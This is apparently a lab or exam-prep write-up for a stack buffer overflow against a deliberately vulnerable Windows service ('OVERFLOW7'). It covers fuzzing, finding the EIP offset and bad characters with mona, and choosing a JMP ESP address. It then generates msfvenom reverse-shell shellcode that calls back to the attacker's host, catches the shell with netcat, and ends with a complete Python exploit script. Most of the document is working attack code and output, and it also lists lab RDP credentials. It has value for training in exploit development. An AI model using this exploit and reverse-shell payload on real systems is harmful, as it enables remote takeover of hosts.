# Buffer Overflow (Task 7)
## Table of Contents 
* [Fuzz the App](#fuzz-the-app)
* [Find the EIP Register](#find-the-eip-register)
* [Identify Bad Characters](#identify-bad-characters)
* [Find a JMP Instruction](#find-a-jmp-instruction)
* [Generate a Payload](#generate-a-payload)
* [Send the Exploit](#send-the-exploit)
  * [Exploit](#exploit)

## Fuzz the App
```bash
USER=admin
PASS=password
TARGET=10.10.27.34
```
```bash
xfreerdp /u:$USER /p:$PASS /cert:ignore /workarea /v:$TARGET
```
```bash
cd exploits
vim fuzzer.py # update the IP variable
python fuzzer.py

# output
[*] Fuzzing: 10.10.27.34
[+] Sent: 100 bytes
[+] Sent: 200 bytes
[+] Sent: 300 bytes
[+] Sent: 400 bytes
[+] Sent: 500 bytes
[+] Sent: 600 bytes
[+] Sent: 700 bytes
[+] Sent: 800 bytes
[+] Sent: 900 bytes
[+] Sent: 1000 bytes
[+] Sent: 1100 bytes
[+] Sent: 1200 bytes
[+] Sent: 1300 bytes
[+] Sent: 1400 bytes
[!] Failed to connect.
```

## Find the EIP Register
```bash
msf-pattern_create -l 1800

# output
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9
```

```bash
# restart the app first
vim exploit.py # PAYLOAD: (output above)
python exploit.py

# output
[*] Attacking: 10.10.27.34
[+] Sent exploit.
```

```bash
!mona findmsp -distance 1800

# output
0BADF00D   [+] Command used:
0BADF00D   !mona findmsp -distance 1800
0BADF00D   [+] Looking for cyclic pattern in memory
74BB0000   Modules C:\Windows\System32\wshtcpip.dll
0BADF00D       Cyclic pattern (normal) found at 0x017ef512 (length 1800 bytes)
0BADF00D       Cyclic pattern (normal) found at 0x0060394a (length 1800 bytes)
0BADF00D       Cyclic pattern (normal) found at 0x00604d7a (length 1800 bytes)
0BADF00D   [+] Examining registers
0BADF00D       EIP contains normal pattern : 0x72423572 (offset 1306) # <--- LOOK AT THIS
0BADF00D       ESP (0x017efa30) points at offset 1310 in normal pattern (length 490)
0BADF00D       EBP contains normal pattern : 0x42347242 (offset 1302)
0BADF00D       EBX contains normal pattern : 0x33724232 (offset 1298)
0BADF00D   [+] Examining SEH chain
0BADF00D   [+] Examining stack (+- 1800 bytes) - looking for cyclic pattern
0BADF00D       Walking stack from 0x017ef328 to 0x017f013c (0x00000e14 bytes)
0BADF00D       0x017ef514 : Contains normal cyclic pattern at ESP-0x51c (-1308) : offset 2, length 1798 (-> 0x017efc19 : ESP+0x1ea)
0BADF00D   [+] Examining stack (+- 1800 bytes) - looking for pointers to cyclic pattern
0BADF00D       Walking stack from 0x017ef328 to 0x017f013c (0x00000e14 bytes)
0BADF00D   [+] Preparing output file 'findmsp.txt'
0BADF00D       - (Re)setting logfile findmsp.txt
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:05.366000
```

## Identify Bad Characters
```bash
bytearray 

# output
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

```bash
# restart the app first
vim exploit.py # OFFSET: 1306, PAYLOAD: (output above), RETN: "BBBB"
python exploit.py

# output
[*] Attacking: 10.10.27.34
[+] Sent exploit.
```

```bash
!mona config -set workingfolder c:\mona\%p

# output
0BADF00D   [+] Command used:
0BADF00D   !mona config -set workingfolder c:\mona\%p
0BADF00D   Writing value to configuration file
0BADF00D   Old value of parameter workingfolder =
0BADF00D   [+] Creating config file, setting parameter workingfolder
0BADF00D   New value of parameter workingfolder =  c:\mona\%p
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00
```

```bash
!mona bytearray -b "\x00"

# output
0BADF00D   [+] Command used:
0BADF00D   !mona bytearray -b "\x00"
0BADF00D    *** Note: parameter -b has been deprecated and replaced with -cpb ***
0BADF00D   Generating table, excluding 1 bad chars...
0BADF00D   Dumping table to file
0BADF00D   [+] Preparing output file 'bytearray.txt'
0BADF00D       - Creating working folder c:\mona\oscp
0BADF00D       - Folder created
0BADF00D       - (Re)setting logfile c:\mona\oscp\bytearray.txt
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
0BADF00D
0BADF00D   Done, wrote 255 bytes to file c:\mona\oscp\bytearray.txt
0BADF00D   Binary output saved in c:\mona\oscp\bytearray.bin
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00.016000
```

```bash
!mona compare -f C:\mona\oscp\bytearray.bin -a 018CFA30

# output
mona Memory comparison results
Address                    Status                     BadChars                   Type                       Location
0x018cfa30                 Corruption after 139 byte  00 8c 8d ae af be bf fb f  normal                     Stack
```

```bash
# repeat until Status = Unmodified: start app, exploit, generate a new byte array, compare to ESP

# ESP     , BADCHARS
# 0188FA30, "\x00\x8c\xae\xbe\xfb"

vim exploit.py # BADCHARS = "\x00\x8c\xae\xbe\xfb"
```

## Find a JMP Instruction
```bash
!mona jmp -r esp -cpb "\x00\x8c\xae\xbe\xfb"

# output
Log data
Address    Message
0BADF00D   [+] Command used:
0BADF00D   !mona jmp -r esp -cpb "\x00\x8c\xae\xbe\xfb"

           ---------- Mona command started on 2021-08-28 12:58:53 (v2.0, rev 605) ----------
0BADF00D   [+] Processing arguments and criteria
0BADF00D       - Pointer access level : X
0BADF00D       - Bad char filter will be applied to pointers : "\x00\x8c\xae\xbe\xfb"
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D   [+] Querying 2 modules
0BADF00D       - Querying module essfunc.dll
0BADF00D       - Querying module oscp.exe
0BADF00D       - Search complete, processing results
0BADF00D   [+] Preparing output file 'jmp.txt'
0BADF00D       - (Re)setting logfile c:\mona\oscp\jmp.txt
0BADF00D   [+] Writing results to c:\mona\oscp\jmp.txt
0BADF00D       - Number of pointers of type 'jmp esp' : 9
0BADF00D   [+] Results :
625011AF     0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False... # <-- USING THIS ONE
# ...snipped...
0BADF00D       Found a total of 9 pointers
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00.327000
```

```bash
# ADDRESS: "\x62\x50\x11\xaf" # address of JMP instruction
# RETN: "\xaf\x11\x50\x62" # address of JMP instrucion, in Little Endian
```

## Generate a Payload

USE YOUR IP ADDRESS FOR THE LHOST!
```bash
ip address
LHOST=10.8.224.177 # change me
BADCHARS="\x00\x8c\xae\xbe\xfb" # change me
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f python -v PAYLOAD EXITFUNC=thread -b $BADCHARS

# output
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of python file: 1842 bytes
PAYLOAD =  b""
PAYLOAD += b"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e"
PAYLOAD += b"\x81\x76\x0e\xce\xde\xfc\x1a\x83\xee\xfc\xe2\xf4"
PAYLOAD += b"\x32\x36\x7e\x1a\xce\xde\x9c\x93\x2b\xef\x3c\x7e"
PAYLOAD += b"\x45\x8e\xcc\x91\x9c\xd2\x77\x48\xda\x55\x8e\x32"
PAYLOAD += b"\xc1\x69\xb6\x3c\xff\x21\x50\x26\xaf\xa2\xfe\x36"
PAYLOAD += b"\xee\x1f\x33\x17\xcf\x19\x1e\xe8\x9c\x89\x77\x48"
PAYLOAD += b"\xde\x55\xb6\x26\x45\x92\xed\x62\x2d\x96\xfd\xcb"
PAYLOAD += b"\x9f\x55\xa5\x3a\xcf\x0d\x77\x53\xd6\x3d\xc6\x53"
PAYLOAD += b"\x45\xea\x77\x1b\x18\xef\x03\xb6\x0f\x11\xf1\x1b"
PAYLOAD += b"\x09\xe6\x1c\x6f\x38\xdd\x81\xe2\xf5\xa3\xd8\x6f"
PAYLOAD += b"\x2a\x86\x77\x42\xea\xdf\x2f\x7c\x45\xd2\xb7\x91"
PAYLOAD += b"\x96\xc2\xfd\xc9\x45\xda\x77\x1b\x1e\x57\xb8\x3e"
PAYLOAD += b"\xea\x85\xa7\x7b\x97\x84\xad\xe5\x2e\x81\xa3\x40"
PAYLOAD += b"\x45\xcc\x17\x97\x93\xb6\xcf\x28\xce\xde\x94\x6d"
PAYLOAD += b"\xbd\xec\xa3\x4e\xa6\x92\x8b\x3c\xc9\x21\x29\xa2"
PAYLOAD += b"\x5e\xdf\xfc\x1a\xe7\x1a\xa8\x4a\xa6\xf7\x7c\x71"
PAYLOAD += b"\xce\x21\x29\x4a\x9e\x8e\xac\x5a\x9e\x9e\xac\x72"
PAYLOAD += b"\x24\xd1\x23\xfa\x31\x0b\x6b\x70\xcb\xb6\xf6\x12"
PAYLOAD += b"\x2e\x6f\x94\x18\xce\xdf\x47\x93\x28\xb4\xec\x4c"
PAYLOAD += b"\x99\xb6\x65\xbf\xba\xbf\x03\xcf\x4b\x1e\x88\x16"
PAYLOAD += b"\x31\x90\xf4\x6f\x22\xb6\x0c\xaf\x6c\x88\x03\xcf"
PAYLOAD += b"\xa6\xbd\x91\x7e\xce\x57\x1f\x4d\x99\x89\xcd\xec"
PAYLOAD += b"\xa4\xcc\xa5\x4c\x2c\x23\x9a\xdd\x8a\xfa\xc0\x1b"
PAYLOAD += b"\xcf\x53\xb8\x3e\xde\x18\xfc\x5e\x9a\x8e\xaa\x4c"
PAYLOAD += b"\x98\x98\xaa\x54\x98\x88\xaf\x4c\xa6\xa7\x30\x25"
PAYLOAD += b"\x48\x21\x29\x93\x2e\x90\xaa\x5c\x31\xee\x94\x12"
PAYLOAD += b"\x49\xc3\x9c\xe5\x1b\x65\x1c\x07\xe4\xd4\x94\xbc"
PAYLOAD += b"\x5b\x63\x61\xe5\x1b\xe2\xfa\x66\xc4\x5e\x07\xfa"
PAYLOAD += b"\xbb\xdb\x47\x5d\xdd\xac\x93\x70\xce\x8d\x03\xcf"
```

## Send the Exploit
```bash
# restart the app first
vim exploit.py # RETN: (address of JMP instruction found), PAYLOAD: (output above), PADDING: "\x90" * 16
python exploit.py

# output
[*] Attacking: 10.10.27.34
[+] Sent exploit.
```

```bash
sudo nc -nvlp 443

# output
listening on [any] 443 ...
connect to [10.8.224.177] from (UNKNOWN) [10.10.27.34] 49206
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\admin\Desktop\vulnerable-apps\oscp>
```

## Exploit
```python
#!/usr/bin/env python3

import socket

IP = "10.10.27.34" # change me
PORT = 1337 # change me
TARGET = (IP,PORT)
PREFIX = "OVERFLOW7 " # change me; vulnerable function of target
OFFSET = 1306 # change me; fuzz the target to determine the correct value
OVERFLOW = "A" * OFFSET # bogus chars that will preceed the 
RETN = "\xaf\x11\x50\x62" # address of a JMP instruction, in Little Endian
PADDING = "\x90" * 16 # so the msfvenom encoder does not overwrite itself
BADCHARS = "\x00\x8c\xae\xbe\xfb" # exclude these from your shellcode
PAYLOAD =  b""
PAYLOAD += b"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e"
PAYLOAD += b"\x81\x76\x0e\xce\xde\xfc\x1a\x83\xee\xfc\xe2\xf4"
PAYLOAD += b"\x32\x36\x7e\x1a\xce\xde\x9c\x93\x2b\xef\x3c\x7e"
PAYLOAD += b"\x45\x8e\xcc\x91\x9c\xd2\x77\x48\xda\x55\x8e\x32"
PAYLOAD += b"\xc1\x69\xb6\x3c\xff\x21\x50\x26\xaf\xa2\xfe\x36"
PAYLOAD += b"\xee\x1f\x33\x17\xcf\x19\x1e\xe8\x9c\x89\x77\x48"
PAYLOAD += b"\xde\x55\xb6\x26\x45\x92\xed\x62\x2d\x96\xfd\xcb"
PAYLOAD += b"\x9f\x55\xa5\x3a\xcf\x0d\x77\x53\xd6\x3d\xc6\x53"
PAYLOAD += b"\x45\xea\x77\x1b\x18\xef\x03\xb6\x0f\x11\xf1\x1b"
PAYLOAD += b"\x09\xe6\x1c\x6f\x38\xdd\x81\xe2\xf5\xa3\xd8\x6f"
PAYLOAD += b"\x2a\x86\x77\x42\xea\xdf\x2f\x7c\x45\xd2\xb7\x91"
PAYLOAD += b"\x96\xc2\xfd\xc9\x45\xda\x77\x1b\x1e\x57\xb8\x3e"
PAYLOAD += b"\xea\x85\xa7\x7b\x97\x84\xad\xe5\x2e\x81\xa3\x40"
PAYLOAD += b"\x45\xcc\x17\x97\x93\xb6\xcf\x28\xce\xde\x94\x6d"
PAYLOAD += b"\xbd\xec\xa3\x4e\xa6\x92\x8b\x3c\xc9\x21\x29\xa2"
PAYLOAD += b"\x5e\xdf\xfc\x1a\xe7\x1a\xa8\x4a\xa6\xf7\x7c\x71"
PAYLOAD += b"\xce\x21\x29\x4a\x9e\x8e\xac\x5a\x9e\x9e\xac\x72"
PAYLOAD += b"\x24\xd1\x23\xfa\x31\x0b\x6b\x70\xcb\xb6\xf6\x12"
PAYLOAD += b"\x2e\x6f\x94\x18\xce\xdf\x47\x93\x28\xb4\xec\x4c"
PAYLOAD += b"\x99\xb6\x65\xbf\xba\xbf\x03\xcf\x4b\x1e\x88\x16"
PAYLOAD += b"\x31\x90\xf4\x6f\x22\xb6\x0c\xaf\x6c\x88\x03\xcf"
PAYLOAD += b"\xa6\xbd\x91\x7e\xce\x57\x1f\x4d\x99\x89\xcd\xec"
PAYLOAD += b"\xa4\xcc\xa5\x4c\x2c\x23\x9a\xdd\x8a\xfa\xc0\x1b"
PAYLOAD += b"\xcf\x53\xb8\x3e\xde\x18\xfc\x5e\x9a\x8e\xaa\x4c"
PAYLOAD += b"\x98\x98\xaa\x54\x98\x88\xaf\x4c\xa6\xa7\x30\x25"
PAYLOAD += b"\x48\x21\x29\x93\x2e\x90\xaa\x5c\x31\xee\x94\x12"
PAYLOAD += b"\x49\xc3\x9c\xe5\x1b\x65\x1c\x07\xe4\xd4\x94\xbc"
PAYLOAD += b"\x5b\x63\x61\xe5\x1b\xe2\xfa\x66\xc4\x5e\x07\xfa"
PAYLOAD += b"\xbb\xdb\x47\x5d\xdd\xac\x93\x70\xce\x8d\x03\xcf"
SUFFIX = "" 
EXPLOIT = PREFIX + OVERFLOW + RETN + PADDING + PAYLOAD + SUFFIX

print("[*] Attacking: %s" % IP)
try:
    CLIENT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    CLIENT.settimeout(3)
    CLIENT.connect(TARGET)
    CLIENT.send(EXPLOIT)
    CLIENT.recv(1024)
    CLIENT.close()
    print("[+] Sent exploit.")
except socket.error as ERROR:
    print("[!] Failed to connect.")
    exit()
```
